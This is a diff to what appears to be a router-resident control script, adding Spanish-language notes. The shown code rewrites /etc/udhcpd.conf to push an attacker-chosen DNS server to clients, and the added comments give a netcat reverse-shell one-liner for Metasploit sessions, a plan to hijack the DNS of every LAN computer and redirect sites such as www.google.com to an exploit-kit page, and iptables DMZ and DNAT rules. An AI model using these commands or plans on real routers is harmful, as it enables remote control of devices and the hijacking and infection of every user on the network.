@@ -446,7 +446,7 @@ while true; do
             
             #in addition we are going to try to modify /etc/udhcpd.conf
             cat /etc/udhcpd.conf > $writabledir/tmp.conf
-	    echo "option dns $param1" > /etc/udhcpd.conf
+	          echo "option dns $param1" > /etc/udhcpd.conf
             if [ $? -eq 0 ]; then
               #it was possible to write directly to /etc/udhcpd.conf
               cat $writabledir/tmp.conf >> /etc/udhcpd.conf
@@ -601,3 +601,75 @@ while true; do
   
 done
 #################################################################################################
+
+
+
+
+
+
+
+
+
+
+
+
+#Esto parece que funciona para hacer un reverse shell, aunque hace falta abrir dos conexiones
+
+#sh -c `nc $2 $3 < /dev/ttyp0 | $0 | nc $2 $3` &
+
+#Pero recibimos dos conexiones en metasploit por lo que se nos abren dos sesiones. Para poder
+#hacerlo con multi/handler debemos hacer exploit -j para que cuando se reciban las conexiones
+#se queden en background las sesiones. Luego podemos usar sessions -c "comando" para ejecutar
+#un comando en todas las sesiones. Lo bueno es que se enviara por la primera sesion el comando
+#que lo va a recibir sh, y nos va a llegar la respuesta al comando por la segunda sesion
+
+
+
+#Otra cosa interesante a implementar es la modificacion de los DNS que devuelve el DHCP del 
+#router, porque gracias a ello podriamos hacer un DNS hijacking y redirigir a todos los ordenadores
+#conectados al router a un DNS nuestro (para este proposito podemos usar el modulo de metasploit
+#de nombre  auxiliary/server/fakedns, que por ejemplo secuestre www.google.com y lo sustituya
+#por una web con exploitkit
+
+
+
+#Sobre iptables:
+#
+#Para añadir nats con protocolo y puertos:
+#
+#iptables -A FORWARD -d <ip red local> -j ACCEPT -p tcp --destination-port 1:65535
+#iptables -A FORWARD -d <ip red local> -j ACCEPT -p udp --destination-port 1:65535
+#
+#Para quitar nats con protocolo y puertos:
+#
+#iptables -A FORWARD -d <ip red local> -j ACCEPT -p tcp --destination-port 1:65535
+#iptables -A FORWARD -d <ip red local> -j ACCEPT -p udp --destination-port 1:65535
+#
+#
+#Para Añadir dmz:
+#
+#iptables -A FORWARD -d <ip red local> -j ACCEPT
+#
+#Para quitar dmz:
+#
+#iptables -D FORWARD -d <ip red local> -j ACCEPT
+#
+#Para redirigir conexiones a una ip hacia otra:
+#
+#iptables -t nat -A PREROUTING -d 1.1.1.1 -p tcp -m tcp --dport 1000:65500 -j DNAT --to-destination 2.2.2.2  #tcp port range
+#iptables -t nat -A PREROUTING -d 1.1.1.1 -p udp -m udp --dport 1000:65500 -j DNAT --to-destination 2.2.2.2  #udp port range
+#iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+
+
+
+#comandos utilizados:
+#expr para sumas, restas, manejo de cadenas, etc...
+#if [ $x -eq 7 ] para comparacion con numeros
+if [ ${LINE} != " " ] para comparacion con cadenas
+#pingnet -> ping
+#adddmz -> iptables
+#deldmz -> iptables
+#interfaces -> ifconfig
+
+
+#sobre sh: parece que se le puede pasar el parametro -c para que ejecute el comando indicado
